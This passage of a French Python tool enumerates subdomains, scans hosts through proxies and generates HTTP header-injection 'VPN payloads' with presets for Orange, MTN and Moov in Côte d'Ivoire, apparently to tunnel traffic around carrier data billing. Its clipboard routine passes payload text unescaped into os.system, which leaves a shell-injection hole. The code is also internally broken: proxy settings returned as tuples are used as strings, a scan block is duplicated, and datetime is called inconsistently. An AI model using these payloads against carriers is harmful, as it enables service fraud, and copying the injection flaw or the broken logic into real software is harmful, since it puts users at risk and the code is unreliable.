            scanner.attach_proxy_manager(proxy_manager, reuse_limit=5)
            scanner.scan_file(filename)
        
            # Export des résultats
            if scanner.results:
                output_file = f"scan_resultats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(output_file, 'w', encoding='utf-8') as f:
                    for r in scanner.results:
                        f.write(f"{r['domain']} | Status: {r['status']} | Server: {r['server']}\n")
                print(Fore.GREEN + f"\n✅ Résultats sauvegardés dans {output_file}")
            else:
                print(Fore.YELLOW + "\nAucun hôte actif détecté.")

        elif choice == "0":
            # Option 0 - Retour
            print(Fore.CYAN + "\nRetour au menu principal...")
            break
            
        else:
            print(Fore.RED + "❌ Option invalide. Veuillez réessayer.")

def show_scan_menu():
    """Affiche le menu des options de scan"""
    console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
    print(Fore.MAGENTA + "\nOptions:")
    print(Fore.CYAN + "1. Mettre à jour la liste des domaines")
    print(Fore.CYAN + "2. Résoudre les DNS et trouver les IPs")
    print(Fore.CYAN + "3. Scanner les résultats actuels")
    print(Fore.CYAN + "0. Retour au menu principal")
    return input(Fore.YELLOW + "Votre choix (1-3): ").strip()

def update_domains(domain, domain_file, ip_file):
    """Force la mise à jour de la liste des domaines"""
    print(Fore.CYAN + "\n🔍 Mise à jour des domaines...")
    try:
        os.remove(domain_file)
        os.remove(ip_file) if os.path.exists(ip_file) else None
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur lors de la suppression des fichiers: {str(e)}")

def resolve_domain(domain):
    """Résout un seul domaine en IP"""
    try:
        socket.setdefaulttimeout(3)
        return socket.gethostbyname(domain)
    except:
        return None

def run_scan(targets):
    """Lance le scan des cibles"""
    temp_file = "temp_scan.txt"
    try:
        with open(temp_file, 'w') as f:
            f.write("\n".join(targets) + "\n")
        
        print(Fore.CYAN + "\n⚡ Préparation du scan...")
        scanner = HostScanner(filename=temp_file)
        scanner.run()
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def get_domains_and_ips(domain):
    """Récupère uniquement les domaines associés"""
    print(Fore.CYAN + f"\n🔍 Recherche des domaines pour {domain}...")
    
    # Vérifier le cache
    cache_file = f"{domain}_domains.txt"
    if os.path.exists(cache_file):
        print(Fore.GREEN + "✓ Chargement depuis le cache existant...")
        with open(cache_file, 'r') as f:
            domains = {line.strip() for line in f if line.strip()}
        return sorted(domains), []  # Retourne une liste d'IPs vide
    
    domains = set()
    
    # Sources disponibles
    sources = [
        {
            'name': 'Hackertarget',
            'url': f"https://api.hackertarget.com/hostsearch/?q={domain}",
            'handler': lambda r: [line.split(',')[0].lower().strip() 
                               for line in r.text.splitlines() if ',' in line]
        },
        {
            'name': 'crt.sh',
            'url': f"https://crt.sh/?q=%25.{domain}&output=json",
            'handler': lambda r: [name.lower().strip() 
                                for cert in r.json() 
                                for name in cert.get('name_value', '').split('\n')
                                if name and '*' not in name and domain in name]
        }
    ]
    
    for source in sources:
        try:
            print(Fore.CYAN + f"▪ Interrogation de {source['name']}...")
            response = requests.get(source['url'], timeout=15)
            if response.status_code == 200:
                domains.update(d for d in source['handler'](response) if d)
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Erreur avec {source['name']}: {str(e)}")
            continue
    
    # Sauvegarde initiale dans le cache
    if domains:
        domains.add(domain)  # Ajout du domaine principal
        with open(cache_file, 'w') as f:
            f.write("\n".join(sorted(domains)))
        print(Fore.GREEN + f"✓ {len(domains)} domaines sauvegardés dans {cache_file}")
    
    return sorted(domains), []  # Retourne une liste d'IPs vide

def is_resolvable_hostname(domain):
    """Vérifie si l'entrée est un nom de domaine et non un CIDR/IP"""
    try:
        # Si c'est une IP ou CIDR, on ne la résout pas
        ipaddress.ip_network(domain, strict=False)
        return False
    except ValueError:
        return True  # C'est probablement un nom de domaine

def resolve_and_scan(domains, proxy=None):
    """Résolution DNS et scan des résultats (en ignorant les CIDR/IP)"""
    if not domains:
        print(Fore.RED + "❌ Aucun domaine à résoudre")
        return []
    
    # Filtrage des domaines non résolvables
    filtered = [d for d in domains if is_resolvable_hostname(d)]

    print(Fore.CYAN + f"\n⚡ Résolution DNS de {len(filtered)} domaines...")
    ips = set()

    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in filtered}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution"):
            ip = future.result()
            if ip:
                ips.add(ip)

    # Sauvegarde des IPs
    if ips:
        ip_file = f"résolution_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips)))
        print(Fore.GREEN + f"✓ {len(ips)} IPs sauvegardées dans {ip_file}")
    
    return sorted(ips)

def main_scan_flow(domain, proxy=None):
    """Flux principal de scan"""
    # Étape 1: Récupération des domaines
    domains, _ = get_domains_and_ips(domain)  # On ignore les IPs ici
    
    if not domains:
        return [], []
    
    # Étape 2: Demande de résolution DNS
    if input(Fore.YELLOW + "\nVoulez-vous résoudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_and_scan(domains, proxy)
        return domains, ips
    
    return domains, []

def resolve_domains(domains, proxy=None):
    """Résolution DNS uniquement lorsque demandé"""
    if not domains:
        return []
    
    print(Fore.CYAN + f"\n⚡ Résolution DNS de {len(domains)} domaines...")
    ips = set()
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution"):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    return sorted(ips)

def scan_domains(domain, proxy=None):
    """Fonction complète avec gestion du cache et résolution optionnelle"""
    # 1. Récupération des domaines
    domains = get_domains_and_ips(domain)
    
    if not domains:
        print(Fore.RED + "❌ Aucun domaine trouvé")
        return [], []
    
    # 2. Demande de résolution DNS
    if input(Fore.YELLOW + "\nVoulez-vous résoudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_domains(domains, proxy)
        
        # Sauvegarde des IPs
        ip_file = f"{domain}_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(ips))
        print(Fore.GREEN + f"✓ {len(ips)} IPs sauvegardées dans {ip_file}")
        
        return domains, ips
    
    return domains, []

def scan_domains_file(domain):
    filename = f"{domain}_domains.txt"
    print(Fore.CYAN + f"[DEBUG] Lecture du fichier IPs depuis : {os.path.abspath(filename)}")
    """Lance un scan sur les sous-domaines extraits"""
    if not os.path.exists(filename):
        print(Fore.RED + f"❌ Fichier {filename} introuvable.")
        return

    threads = input("Nombre de threads (10-500) : ").strip()
    try:
        threads = max(10, min(500, int(threads)))
    except:
        threads = 100

    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo proxy ? (o/n) : ").lower() == "o"

    scanner = HostScanner(
        filename=filename,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()
    
def scan_resolved_ips(ip_file=None):
    """Scan les IPs à partir d'un fichier spécifié ou par défaut."""
    # Demander le fichier si non spécifié
    if ip_file is None:
        default_file = "resolved_ips.txt"
        print(Fore.CYAN + f"\nEntrez le chemin du fichier contenant les IPs (vide pour '{default_file}'):")
        user_input = input(Fore.YELLOW + "> Chemin du fichier : ").strip()
        
        ip_file = user_input if user_input else default_file

    # Vérifier l'existence du fichier
    if not os.path.exists(ip_file):
        print(Fore.RED + f"\n❌ Erreur : Le fichier '{ip_file}' n'existe pas.")
        print(Fore.YELLOW + "Veuillez vérifier le chemin et réessayer.")
        return

    # Lire les IPs
    try:
        with open(ip_file, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
            
        if not ips:
            print(Fore.YELLOW + "⚠️ Avertissement : Le fichier ne contient aucune IP valide.")
            return
            
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur lors de la lecture du fichier : {e}")
        return

    # Configuration du scan
    print(Fore.GREEN + f"\n✔ Fichier chargé : {len(ips)} IPs à scanner")
    
    try:
        threads = int(input(Fore.YELLOW + "Nombre de threads (10-500, défaut 100) : ") or 100)
        threads = max(10, min(500, threads))
    except ValueError:
        print(Fore.RED + "❌ Valeur invalide. Utilisation de 100 threads par défaut.")
        threads = 100

    # Configuration proxy/turbo
    proxy = get_proxy_config()
    turbo = False
    
    if proxy == "auto":
        turbo = input(Fore.YELLOW + "Activer le mode turbo pour proxy ? (o/n, défaut non) : ").lower() == "o"

    # Lancement du scan
    print(Fore.CYAN + "\n⚡ Démarrage du scan...")
    
    scanner = HostScanner(
        filename=ip_file,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()

    # Sauvegarde du dernier fichier utilisé
    global LAST_RESOLVED_IP_FILE
    LAST_RESOLVED_IP_FILE = ip_file

    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo pour proxy ? (o/n) : ").lower() == "o"

    scanner = HostScanner(
        filename=ip_file,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()
    
def load_from_cache(filename):
    """Charge les résultats depuis un fichier cache"""
    domains = set()
    ips = set()
    
    with open(filename, 'r') as f:
        current_section = None
        for line in f:
            line = line.strip()
            if line.startswith('# Domaines:'):
                current_section = 'domains'
            elif line.startswith('# IPs:'):
                current_section = 'ips'
            elif line and current_section == 'domains':
                domains.add(line)
            elif line and current_section == 'ips':
                ips.add(line)
    
    return sorted(domains), sorted(ips)

def save_to_cache(filename, domains, ips):
    """Sauvegarde les résultats dans un fichier cache"""
    with open(filename, 'w') as f:
        f.write(f"# Fichier cache pour {os.path.basename(filename).replace('.txt', '')}\n")
        f.write(f"# Dernière mise à jour: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write("# Domaines:\n")
        f.write("\n".join(sorted(domains)))
        f.write("\n\n# IPs:\n")
        f.write("\n".join(sorted(ips)))
    
    print(Fore.GREEN + f"\n✓ Résultats sauvegardés dans {filename}")

def update_cache(domain, new_domains, new_ips):
    """Met à jour un fichier cache existant"""
    cache_file = f"{domain}.txt"
    if not os.path.exists(cache_file):
        return save_to_cache(cache_file, new_domains, new_ips)
    
    # Charger les anciennes données
    old_domains, old_ips = load_from_cache(cache_file)
    
    # Fusionner et nettoyer les données
    updated_domains = set(old_domains).union(new_domains)
    updated_ips = set(old_ips).union(new_ips)
    
    # Resauvegarder
    save_to_cache(cache_file, updated_domains, updated_ips)
    
def bulk_dns_resolve(domains, timeout=3, max_workers=50):
    """Résolution DNS parallèle avec gestion d'erreur"""
    resolved = {}
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(timeout)
            answers = socket.getaddrinfo(domain, None)
            return domain, list({answer[4][0] for answer in answers})
        except:
            return domain, []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in as_completed(futures):
            domain, ip_list = future.result()
            if ip_list:
                resolved[domain] = ip_list

    return resolved

def save_and_clean_results(domains, ips, domain):
    """Sauvegarde et nettoie les résultats"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_{domain}_{timestamp}.txt"
    
    # Nettoyage final
    domains = sorted({d.lower().strip() for d in domains if d and '*' not in d})
    ips = sorted({ip.strip() for ip in ips if ip and ip.replace('.', '').isdigit()})
    
    with open(filename, 'w') as f:
        f.write(f"# Résultats pour {domain} - {timestamp}\n\n")
        f.write("# Domaines valides:\n")
        f.write("\n".join(domains) + "\n\n")
        f.write("# IPs valides:\n")
        f.write("\n".join(ips) + "\n")
    
    print(Fore.GREEN + f"\n✅ Résultats sauvegardés dans {filename}")
    print(Fore.CYAN + f"📋 Total: {len(domains)} domaines et {len(ips)} IPs valides")
    
    return filename
    
# ==============================================
# FONCTION PRINCIPALE
# ==============================================

def get_proxy_config():
    choix = input("Utiliser un proxy? (o/n/auto/scan) : ").strip().lower()
    turbo_mode = False

    if not choix:
        return None, False  # Retour immédiat

    if choix == "o":
        mode = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) (Entrée pour retour) : ").strip()
        if not mode:
            return None, False
        if mode == "1":
            proxy = input("URL du proxy (ex: http://123.45.67.89:8080) (Entrée pour retour) : ").strip()
            if not proxy:
                return None, False
            return proxy, False
        elif mode == "2":
            proxy = select_proxy_interactive()
            return proxy, False
        return None, False

    elif choix == "auto":
        return "auto", False

    elif choix == "scan":
        proxy_file = "proxies.txt"
        if not os.path.exists(proxy_file):
            print(Fore.YELLOW + "⚠️ Fichier proxies.txt introuvable.")
            return None, False

        with open(proxy_file) as f:
            proxies = [line.split("|")[0].strip() for line in f if line.strip().startswith("http")]

        if not proxies:
            print(Fore.RED + "❌ Aucun proxy valide dans proxies.txt")
            return None, False

        print(Fore.CYAN + "\nType de test de proxy :")
        print("1. HTTPS (plus sécurisé)")
        print("2. HTTP (plus tolérant)")
        test_type = input("Choix (1/2) (Entrée pour retour) : ").strip()
        if not test_type:
            return None, False

        test_url = "https://www.google.com" if test_type == "1" else "http://httpbin.org/ip"

        print(Fore.CYAN + "⏳ Test des proxies...")

        for p in proxies:
            try:
                start = time.time()
                r = requests.get(test_url, proxies={"http": p, "https": p}, timeout=4)
                if r.ok:
                    elapsed = time.time() - start
                    print(Fore.GREEN + f"✅ {p} - {elapsed:.2f}s (sélectionné)")
                    return p, True
            except Exception as e:
                print(Fore.RED + f"❌ {p} - {type(e).__name__}")

        print(Fore.RED + "❌ Aucun proxy fonctionnel trouvé. Utilisation sans proxy.")
        return None, False

    return None, False

def ask_for_rescan(scanner):
    if not scanner.last_up_hosts:
        return

    choix = input("\nRe-scanner les hôtes actifs ? (o/n) : ").strip().lower()
    if choix != 'o':
        return

    while True:
        try:
            fois = int(input("Combien de fois souhaitez-vous re-scanner ? (1-10) : "))
            if 1 <= fois <= 10:
                break
            print("Veuillez entrer un nombre entre 1 et 10.")
        except ValueError:
            print("Veuillez entrer un nombre valide.")

    while True:
        try:
            pause = int(input("Temps de pause entre chaque re-scan (en secondes, 0-30) : "))
            if 0 <= pause <= 30:
                break
            print("Veuillez entrer un nombre entre 0 et 30.")
        except ValueError:
            print("Veuillez entrer un nombre valide.")

    for i in range(fois):
        print(f"\nRe-scan {i+1}/{fois}...")
        scanner.rescan_active_hosts()
        if i < fois - 1:
            time.sleep(pause)

def launch_background_tasks():
    """Lance les opérations longues ou dépendantes du réseau sans bloquer le démarrage"""
    def background():
        try:
            # Ces tâches prennent du temps / nécessitent Internet
            if 'termux' in sys.executable:
                installer.setup_termux()
                installer.install_subfinder()
                installer.install_sublist3r()
        except:
            pass  # Discret et silencieux

    threading.Thread(target=background, daemon=True).start()

def afficher_banniere():
    console.print("""
╔════════════════════════════════════════════════════╗
║      Générateur de Payload VPN Pro               ║
║             DjahNoDead  🕵️‍♂️                   ║
║     🕓 Mise à jour : 23 Juin 2025                     ║
╚════════════════════════════════════════════════════╝
""", style="bold cyan")

HISTORY_FILE = "payload_history.json"
PRESETS = {
    "Orange CI": {
        "host": "orange.ci",
        "port": 80,
        "method": "GET",
        "path": "/",
        "type": "split"
    },
    "MTN CI": {
        "host": "mtn.ci",
        "port": 80,
        "method": "GET",
        "path": "/",
        "type": "split"
    },
    "Moov Africa CI": {
        "host": "moov-africa.ci",
        "port": 80,
        "method": "GET",
        "path": "/",
        "type": "split"
    }
}

def extract_all_hosts_from_payload(payload):
    """
    Extrait tous les hôtes uniques présents dans les headers HTTP d'un payload.
    Nettoie les ports ou chemins éventuels et filtre les doublons.
    """
    headers = ["Host", "X-Online-Host", "X-Forward-Host"]
    found_hosts = set()

    for header in headers:
        matches = re.findall(rf"(?i)^{header}:\s*(.+)$", payload, re.MULTILINE)
        for match in matches:
            raw_host = match.strip()
            # Utilise urlparse pour normaliser (supprime le port ou chemin éventuel)
            parsed = urlparse(f"//{raw_host}")
            host = parsed.hostname or raw_host
            if host:
                found_hosts.add(host)

    return list(found_hosts)

def test_socket(host, port, payload):
    console.print(f"[cyan]→ Test socket vers {host}:{port}...[/cyan]")
    try:
        with socket.create_connection((host, port), timeout=5) as s:
            if not payload.endswith("\r\n\r\n"):
                payload += "\r\n\r\n"
            s.sendall(payload.encode())
            response = s.recv(1024).decode(errors="ignore")
            if "HTTP/1.1" in response or "200" in response:
                console.print("[green]✔ Socket : Réponse HTTP détectée[/green]")
                return True
            else:
                console.print("[yellow]⚠ Socket : réponse non standard[/yellow]")
                return False
    except Exception as e:
        console.print(f"[red]❌ Échec socket : {e}[/red]")
        return False

def test_http(host, path):
    try:
        url = f"http://{host}{path}"
        r = requests.get(url, timeout=5)
        if r.status_code in [200, 301, 302]:
            console.print(f"[green]✔ HTTP : {r.status_code} OK[/green]")
            return True
        else:
            console.print(f"[yellow]⚠ HTTP : Code {r.status_code}[/yellow]")
            return False
    except Exception as e:
        console.print(f"[red]❌ Erreur HTTP : {e}[/red]")
        return False

def check_host_validity(host, port=80, timeout=3):
    """
    Vérifie si un hôte est valide :
    - Résolution DNS possible
    - Connexion socket réussie
    """
    try:
        # Vérifie la résolution DNS
        ip = socket.gethostbyname(host)

        # Tente une connexion socket
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False

def extract_and_filter_valid_hosts(payload, port=80):
    """
    Extrait tous les hôtes du payload et retourne uniquement ceux accessibles.
    """
    hosts = extract_all_hosts_from_payload(payload)
    valid_hosts = []

    for host in hosts:
        if check_host_validity(host, port=port):
            valid_hosts.append(host)

    return valid_hosts
    
def validate_host(host):
    return re.match(r'^([a-zA-Z0-9.-]+)$', host)

def validate_port(port_str):
    try:
        port = int(port_str)
        return 1 <= port <= 65535
    except:
        return False

def scan_common_ports(host, ports=None, timeout=2):
    """
    Teste une liste de ports courants sur un hôte donné.
    Retourne une liste de ports ouverts.
    """
    if ports is None:
        ports = [80, 443, 8080, 8000, 3128, 8888]

    open_ports = []
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                open_ports.append(port)
        except Exception:
            continue
    return open_ports

def extract_and_scan_hosts(payload, ports=None):
    """
    Extrait les hôtes d’un payload, vérifie leur validité,
    et retourne un dictionnaire {host: [ports ouverts]}
    """
    hosts = extract_all_hosts_from_payload(payload)
    host_ports = {}

    for host in hosts:
        try:
            socket.gethostbyname(host)  # vérifie DNS
            open_ports = scan_common_ports(host, ports=ports)
            if open_ports:
                host_ports[host] = open_ports
        except socket.gaierror:
            continue

    return host_ports

def load_history():
    return json.load(open(HISTORY_FILE)) if os.path.exists(HISTORY_FILE) else []

def save_history(entry):
    history = load_history()
    history.append(entry)
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=4)

def show_history():
    history = load_history()
    if not history:
        console.print("[yellow]Aucun payload enregistré.[/yellow]")
        return
    table = Table(title="📜 Historique des Payloads")
    table.add_column("Date", style="cyan")
    table.add_column("Host", style="green")
    table.add_column("Type", style="magenta")
    for item in history:
        table.add_row(item["timestamp"], item["host"], item["type"])
    console.print(table)

def generate_payload(host, method, path, payload_type, headers=None):
    headers = headers or {}
    method = method.upper()
    payload = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"

    if payload_type == "split":
        payload += f"X-Online-Host: {host}\r\nX-Forward-Host: {host}\r\n"
    elif payload_type == "reverse":
        payload = f"CONNECT {host}@{host}:443 HTTP/1.0\r\nHost: {host}\r\n"
    elif payload_type == "sni":
        payload += f"X-Tunnel-Host: {host}\r\n"
    elif payload_type == "direct":
        payload += ""  # rien à ajouter, mais inclus explicitement
    elif payload_type == "custom":
        for k, v in headers.items():
            payload += f"{k}: {v}\r\n"

    # Ajout automatique de la fin de headers si manquante
    if not payload.endswith("\r\n\r\n"):
        payload += "Connection: Keep-Alive\r\n\r\n"

    return payload

def choose_preset():
    console.print("[bold cyan]Choisissez un preset opérateur :[/bold cyan]")
    preset_list = list(PRESETS.items())
    for i, (name, _) in enumerate(preset_list):
        console.print(f"[{i}] {name}")

    while True:
        idx = Prompt.ask("Choix", default="0")
        if idx.isdigit() and 0 <= int(idx) < len(preset_list):
            return preset_list[int(idx)][1]
        else:
            console.print(f"[red]Index invalide. Entrez un chiffre entre 0 et {len(preset_list) - 1}[/red]")

def validate_host(host):
    try:
        socket.gethostbyname(host)
        return True
    except socket.error:
        return False

def validate_port(port_str):
    try:
        port = int(port_str)
        return 1 <= port <= 65535
    except:
        return False

def export_payload(payload, host):
    EXPORT_FOLDER = "exports"
    if not os.path.exists(EXPORT_FOLDER):
        os.makedirs(EXPORT_FOLDER)

    filename = f"payload_{host}_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    path = os.path.join(EXPORT_FOLDER, filename)
    with open(path, "w") as f:
        f.write(payload)
    console.print(f"[blue]✔ Exporté : {path}[/blue]")

def build_payload_interactively():
    preset_use = Prompt.ask("Utiliser un preset ? (o/n)", default="o")
    
    if preset_use.lower() == "o":
        preset = choose_preset()
        if not preset:
            return
        host, port, method, path, ptype = preset.values()
    else:
        host = Prompt.ask("Nom de domaine ou IP")
        while not validate_host(host):
            host = Prompt.ask("[red]Entrée invalide. Refaire :[/red]")

        port = Prompt.ask("Port", default="80")
        while not validate_port(port):
            port = Prompt.ask("[red]Port invalide. Refaire :[/red]")
        port = int(port)

        method = Prompt.ask("Méthode HTTP", default="GET")
        path = Prompt.ask("Chemin URL (ex: /)", default="/")
        ptype = Prompt.ask("Type (split, sni, reverse, direct, custom)", default="split")

    headers = {}
    if ptype == "custom":
        console.print("[bold yellow]Ajoutez vos headers personnalisés (format : clé: valeur). Tapez 'done' pour terminer.[/bold yellow]")
        while True:
            h = input("> ").strip()
            if h.lower() == "done":
                break
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
            else:
                console.print("[red]Format invalide. Utilisez : clé: valeur[/red]")

    payload = generate_payload(host, method, path, ptype, headers)
    console.print(Panel(payload, title="📦 Payload généré", border_style="cyan"))

    if Prompt.ask("Tester ce payload maintenant ? (o/n)", default="o") == "o":
        test_socket(host, port, payload)
        test_http(host, path)

    if Prompt.ask("Sauvegarder ce payload ? (o/n)", default="o") == "o":
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "port": port,
            "method": method,
            "path": path,
            "type": ptype,
            "headers": headers,
            "payload": payload
        }
        save_history(entry)
        export_payload(payload, host)
        console.print("[green]✔ Payload sauvegardé avec succès[/green]")
        
def test_payload_from_source():
    console.print("\n[bold magenta]Tester un payload existant[/bold magenta]")
    console.print("[1] Coller manuellement un payload")
    console.print("[2] Charger depuis un fichier .txt ou .json")
    console.print("[3] Extraire automatiquement depuis un fichier brut")
    console.print("[0] Retour")

    option = Prompt.ask("Choix", default="1")

    if option == "1":
        console.print("👉 Collez le payload (Entrée 2x pour terminer)")
        lines = []
        while True:
            line = input()
            if line.strip() == "":
                break
            lines.append(line)
        payload = "\r\n".join(lines)

        hosts = extract_all_hosts_from_payload(payload)
        suggested_host = hosts[0] if hosts else None
        default_host = suggested_host if suggested_host else "example.com"
        host = Prompt.ask("Host cible", default=default_host)
        
        port_input = Prompt.ask("Port", default="80")
        while not validate_port(port_input):
            port_input = Prompt.ask("[red]Port invalide. Refaire :[/red]")
        port = int(port_input)

        test_socket(host, port, payload)
        if port in [80, 443]:
            test_http(host, "/")

    elif option == "2":
        file_path = Prompt.ask("Chemin du fichier .txt ou .json")
    
        if not os.path.isfile(file_path):
            console.print("[red]❌ Fichier introuvable.[/red]")
            return
    
        payloads = []
    
        # === Lecture JSON ===
        if file_path.endswith(".json"):
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    for item in data:
                        raw = item.get("payload", "").replace("\\r\\n", "\r\n").strip()
                        if raw:
                            payloads.append(raw)
            except Exception as e:
                console.print(f"[red]Erreur JSON : {e}[/red]")
                return
        else:
            # === Lecture .txt (payloads séparés par ligne vide) ===
            with open(file_path, "r", encoding="utf-8") as f:
                block = []
                for line in f:
                    if line.strip() == "":
                        if block:
                            payloads.append("\r\n".join(block).strip())
                            block = []
                    else:
                        block.append(line.rstrip())
                if block:
                    payloads.append("\r\n".join(block).strip())
    
        if not payloads:
            console.print("[red]⚠ Aucun payload détecté[/red]")
            return
    
        console.print(f"[cyan]📦 {len(payloads)} payload(s) détecté(s)[/cyan]")
    
        result_log = []
    
        for i, payload in enumerate(payloads):
            console.print(Panel(payload, title=f"Payload #{i+1}", border_style="blue"))
    
            hosts = extract_all_hosts_from_payload(payload)
    
            if not hosts:
                host = Prompt.ask("Aucun host détecté. Entrez-en un manuellement")
                hosts = [host]
    
            if len(hosts) == 1:
                chosen_hosts = [hosts[0]]
            else:
                console.print(f"[yellow]🧭 Hôtes détectés :[/yellow] {', '.join(hosts)}")
                console.print("[1] Utiliser le premier")
                console.print("[2] Choisir manuellement")
                console.print("[3] Tester tous")
    
                choice = Prompt.ask("Votre choix", choices=["1", "2", "3"], default="1")
                if choice == "1":
                    chosen_hosts = [hosts[0]]
                elif choice == "2":
                    for idx, h in enumerate(hosts):
                        console.print(f"[{idx}] {h}")
                    try:
                        idx = int(Prompt.ask("Index de l’hôte", default="0"))
                        chosen_hosts = [hosts[idx]]
                    except (ValueError, IndexError):
                        console.print("[red]Index invalide. Utilisation du premier hôte[/red]")
                        chosen_hosts = [hosts[0]]
                else:
                    chosen_hosts = hosts
    
            for host in chosen_hosts:
                port = 443 if "CONNECT" in payload.upper() else 80
                console.print(f"[yellow]🔌 Test de connexion : {host}:{port}[/yellow]")
    
                socket_ok = test_socket(host, port, payload)
                http_ok = test_http(host, "/") if port in [80, 443] else False
    
                socket_status = "OK" if socket_ok else "Échec"
                http_status = "OK" if http_ok else "Échec"
    
                result_entry = (
                    f"Payload #{i+1}:\n{payload}\n"
                    f"[Host: {host} | Port: {port} | Socket: {socket_status} | HTTP: {http_status}]\n"
                    + "-" * 60 + "\n"
                )
                result_log.append(result_entry)
    
        with open("results.txt", "w", encoding="utf-8") as f:
            f.writelines(result_log)
    
        console.print(f"\n[green]✔ Résultats enregistrés dans [bold]results.txt[/bold][/green]")
    
        # === OPTIONS D'EXPORT ===
        console.print("\n[bold cyan]🔽 Options supplémentaires[/bold cyan]")
        console.print("[1] Exporter chaque résultat séparément")
        console.print("[2] Exporter tous les résultats dans un seul fichier")
        console.print("[3] Copier un payload")
        console.print("[0] Ignorer")
    
        choice = Prompt.ask("Votre choix", choices=["1", "2", "3", "4"], default="4")
    
        if choice == "1":
            for idx, res in enumerate(result_log, start=1):
                name = f"payload_result_{idx}.txt"
                with open(name, "w", encoding="utf-8") as f:
                    f.write(res)
                console.print(f"[green]✔ {name} enregistré[/green]")
    
        elif choice == "2":
            name = Prompt.ask("Nom du fichier", default="payloads_all.txt")
            with open(name, "w", encoding="utf-8") as f:
                f.writelines(result_log)
            console.print(f"[green]✔ Tous les résultats dans : {name}[/green]")
    
        elif choice == "3":
            try:
                idx = int(Prompt.ask("Numéro du payload à copier")) - 1
                if 0 <= idx < len(payloads):
                    content = payloads[idx]
                    if os.system("command -v termux-clipboard-set > /dev/null") == 0:
                        os.system(f"echo '{content}' | termux-clipboard-set")
                        console.print("[green]📋 Payload copié[/green]")
                    else:
                        console.print("[red]❌ Clipboard : termux-clipboard-set non disponible[/red]")
                else:
                    console.print("[red]Numéro invalide[/red]")
            except ValueError:
                console.print("[red]Entrée non valide[/red]")
    
    elif option == "3":
        test_payload_from_raw_file()

    elif option == "0":
        return                                                                                                                                

def extract_http_blocks_from_raw_text(text):
    """
    Extrait des blocs HTTP (payloads) depuis du texte brut, même si incomplets ou mal formés.
    Un bloc commence par une ligne de type GET /... HTTP/1.1 ou CONNECT ...
    """
    lines = text.splitlines()
    blocks = []
    current_block = []

    http_start = re.compile(r"^(GET|POST|HEAD|PUT|DELETE|OPTIONS|CONNECT)\s+", re.IGNORECASE)

    for line in lines:
        if http_start.match(line):
            if current_block:
                blocks.append("\r\n".join(current_block))
                current_block = []
        if line.strip() != "":
            current_block.append(line.strip())

    if current_block:
        blocks.append("\r\n".join(current_block))

    # Nettoyage final
    unique_blocks = list({b.strip() for b in blocks if len(b.strip()) >= 10})
    return unique_blocks

def filter_payloads(payloads):
    """
    Affiche un menu interactif pour filtrer dynamiquement une liste de payloads.
    Retourne la liste filtrée.
    """
    if Prompt.ask("\nSouhaitez-vous appliquer un filtrage sur les payloads ? (y/n)", default="n") != "y":
        return payloads

    filtered_payloads = payloads[:]

    while True:
        console.print("\n[bold cyan]🎯 MENU DE FILTRAGE[/bold cyan]")
        console.print("[1] Par méthode HTTP")
        console.print("[2] Par header(s) requis")
        console.print("[3] Par taille du payload")
        console.print("[4] Par mot-clé (contenu)")
        console.print("[5] Appliquer les filtres et continuer")
        console.print("[0] Annuler le filtrage")

        choice = Prompt.ask("Choix", choices=["0", "1", "2", "3", "4", "5"], default="5")

        if choice == "0":
            return payloads

        elif choice == "1":
            console.print("Méthode :")
            console.print("[1] GET uniquement")
            console.print("[2] CONNECT uniquement")
            console.print("[3] Toutes")
            method_choice = Prompt.ask("Votre choix", choices=["1", "2", "3"], default="3")

            original_count = len(filtered_payloads)
            if method_choice == "1":
                filtered_payloads = [p for p in filtered_payloads if p.strip().upper().startswith("GET")]
            elif method_choice == "2":
                filtered_payloads = [p for p in filtered_payloads if p.strip().upper().startswith("CONNECT")]
            console.print(f"[green]✔ {len(filtered_payloads)} payload(s) après filtrage par méthode (sur {original_count})[/green]")

        elif choice == "2":
            headers_input = Prompt.ask("Entrez les headers requis (ex: Host,X-Forwarded-For)")
            required_headers = [h.strip().lower() for h in headers_input.split(",") if h.strip()]

